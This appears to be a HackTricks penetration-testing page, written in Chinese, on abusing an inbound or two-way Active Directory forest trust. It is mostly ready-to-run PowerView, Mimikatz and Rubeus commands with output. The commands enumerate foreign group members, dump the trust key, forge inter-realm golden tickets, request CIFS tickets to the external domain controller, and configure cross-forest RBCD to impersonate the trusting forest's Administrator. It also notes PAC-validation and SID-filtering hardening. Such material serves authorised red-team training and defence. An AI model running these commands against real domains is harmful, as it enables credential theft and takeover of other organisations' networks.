# 外部 Forest Domain - OneWay (Inbound) 或双向

{{#include ../../banners/hacktricks-training.md}}

在此场景中，外部 domain 信任你（或双方互相信任），因此你可以获得对其的某种访问权限。

## 枚举

首先，你需要**枚举**该**信任关系**：
```bash
Get-DomainTrust
SourceName      : a.domain.local   --> Current domain
TargetName      : domain.external  --> Destination domain
TrustType       : WINDOWS-ACTIVE_DIRECTORY
TrustAttributes :
TrustDirection  : Inbound          --> Inboud trust
WhenCreated     : 2/19/2021 10:50:56 PM
WhenChanged     : 2/19/2021 10:50:56 PM

# Get name of DC of the other domain
Get-DomainComputer -Domain domain.external -Properties DNSHostName
dnshostname
-----------
dc.domain.external

# Groups that contain users outside of its domain and return its members
Get-DomainForeignGroupMember -Domain domain.external
GroupDomain             : domain.external
GroupName               : Administrators
GroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=domain,DC=external
MemberDomain            : domain.external
MemberName              : S-1-5-21-3263068140-2042698922-2891547269-1133
MemberDistinguishedName : CN=S-1-5-21-3263068140-2042698922-2891547269-1133,CN=ForeignSecurityPrincipals,DC=domain,
DC=external

# Get name of the principal in the current domain member of the cross-domain group
ConvertFrom-SID S-1-5-21-3263068140-2042698922-2891547269-1133
DEV\External Admins

# Get members of the cros-domain group
Get-DomainGroupMember -Identity "External Admins" | select MemberName
MemberName
----------
crossuser

# Lets list groups members
## Check how the "External Admins" is part of the Administrators group in that DC
Get-NetLocalGroupMember -ComputerName dc.domain.external
ComputerName : dc.domain.external
GroupName    : Administrators
MemberName   : SUB\External Admins
SID          : S-1-5-21-3263068140-2042698922-2891547269-1133
IsGroup      : True
IsDomain     : True

# You may also enumerate where foreign groups and/or users have been assigned
# local admin access via Restricted Group by enumerating the GPOs in the foreign domain.

# Additional trust hygiene checks (AD RSAT / AD module)
Get-ADTrust -Identity domain.external -Properties SelectiveAuthentication,SIDFilteringQuarantined,SIDFilteringForestAware,TGTDelegation,ForestTransitive
```
> `SelectiveAuthentication`/`SIDFiltering*` 让你可以快速判断跨 forest abuse paths（RBCD、SIDHistory）是否可能在无需额外前提条件的情况下生效。<sup>[[2]](#references)</sup>

在之前的 enumeration 中发现，用户 **`crossuser`** 属于 **`External Admins`** 组，并且在外部 domain 的 **DC** 中拥有 **Admin access**。

## Initial Access

如果你**无法**发现你的用户在其他 domain 中拥有任何**特殊** access，仍然可以回到 AD Methodology，尝试从**非特权用户**进行 **privesc**（例如 kerberoasting）：

你可以使用 **Powerview functions**，通过 `-Domain` 参数对**其他 domain**进行 **enumerate**，例如：
```bash
Get-DomainUser -SPN -Domain domain_name.local | select SamAccountName
```
{{#ref}}
./
{{#endref}}

## 冒充

### 登录

使用拥有外部域访问权限的用户凭据，通过常规方法，你应该能够访问：
```bash
Enter-PSSession -ComputerName dc.external_domain.local -Credential domain\administrator
```
### SID History Abuse

你还可以跨 forest trust abuse [**SID History**](sid-history-injection.md)。

如果用户从 **一个 forest 迁移到另一个 forest**，且未启用 **SID Filtering**，则可以**添加来自另一个 forest 的 SID**；在用户**跨 trust 进行身份验证**时，此 **SID** 将被**添加到用户的 token** 中。

> [!WARNING]
> 提醒一下，你可以使用以下命令获取 signing key：
>
> ```bash
> Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dc.domain.local
> ```

你可以使用 **trusted** key **签名**，从而**伪装成**当前 domain 中的用户生成 **TGT**。
```bash
# Get a TGT for the cross-domain privileged user to the other domain
Invoke-Mimikatz -Command '"kerberos::golden /user:<username> /domain:<current domain> /SID:<current domain SID> /rc4:<trusted key> /target:<external.domain> /ticket:C:\path\save\ticket.kirbi"'

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:C:\path\save\ticket.kirbi /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### 完整地冒充用户
```bash
# Get a TGT of the user with cross-domain permissions
Rubeus.exe asktgt /user:crossuser /domain:sub.domain.local /aes256:70a673fa756d60241bd74ca64498701dbb0ef9c5fa3a93fe4918910691647d80 /opsec /nowrap

# Get a TGT from the current domain for the target domain for the user
Rubeus.exe asktgs /service:krbtgt/domain.external /domain:sub.domain.local /dc:dc.sub.domain.local /ticket:doIFdD[...snip...]MuSU8= /nowrap

# Use this inter-realm TGT to request a TGS in the target domain to access the CIFS service of the DC
## We are asking to access CIFS of the external DC because in the enumeration we show the group was part of the local administrators group
Rubeus.exe asktgs /service:cifs/dc.domain.external /domain:dc.domain.external /dc:dc.domain.external /ticket:doIFMT[...snip...]5BTA== /nowrap

# Now you have a TGS to access the CIFS service of the domain controller
```
### Cross-forest RBCD when you control a machine account in the trusting forest (no SID filtering / selective auth)

如果你的 foreign principal (FSP) 将你置于一个能够在 trusting forest 中写入 computer objects 的 group 中（例如 `Account Operators`、自定义 provisioning group），你可以在该 forest 的 target host 上配置 **Resource-Based Constrained Delegation**，并 impersonate 其中的任意 user：
```bash
# 1) From the trusted domain, create or compromise a machine account (MYLAB$) you control
# 2) In the trusting forest (domain.external), set msDS-AllowedToAct on the target host for that account
Set-ADComputer -Identity victim-host$ -PrincipalsAllowedToDelegateToAccount MYLAB$
# or with PowerView
Set-DomainObject victim-host$ -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sidbytes_of_MYLAB}

# 3) Use the inter-forest TGT to perform S4U to victim-host$ and get a CIFS ticket as DA of the trusting forest
Rubeus.exe s4u /ticket:interrealm_tgt.kirbi /impersonate:EXTERNAL\Administrator /target:victim-host.domain.external /protocol:rpc
```
只有在 **SelectiveAuthentication 已禁用** 且 **SID filtering** 未剥离你所控制的 SID 时，这种方法才有效。这是一条快速的横向移动路径，无需伪造 SIDHistory，并且在 trust review 中经常被遗漏。<sup>[[2]](#references)</sup>

### PAC 验证加固

针对 **CVE-2024-26248**/**CVE-2024-29056** 的 PAC 签名验证更新，增加了对跨 forest ticket 的签名强制要求。在 **Compatibility mode** 中，伪造的 inter-realm PAC/SIDHistory/S4U 路径在未打补丁的 DC 上仍可能有效。在 **Enforcement mode** 中，跨越 forest trust 的未签名或被篡改的 PAC 数据会被拒绝，除非你同时持有目标 forest trust key。注册表覆盖项（`PacSignatureValidationLevel`、`CrossDomainFilteringLevel`）在仍可用期间可能削弱此保护。<sup>[[1]](#references)</sup>

## References

- [1] [Microsoft KB5037754 – 针对 CVE-2024-26248 和 CVE-2024-29056 的 PAC 验证变更](https://support.microsoft.com/en-au/topic/how-to-manage-pac-validation-changes-related-to-cve-2024-26248-and-cve-2024-29056-6e661d4f-799a-4217-b948-be0a1943fef1)
- [2] [MS-PAC 规范 – SID filtering 与 claims transformation 详细信息](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/55fc19f2-55ba-4251-8a6a-103dd7c66280)
{{#include ../../banners/hacktricks-training.md}}
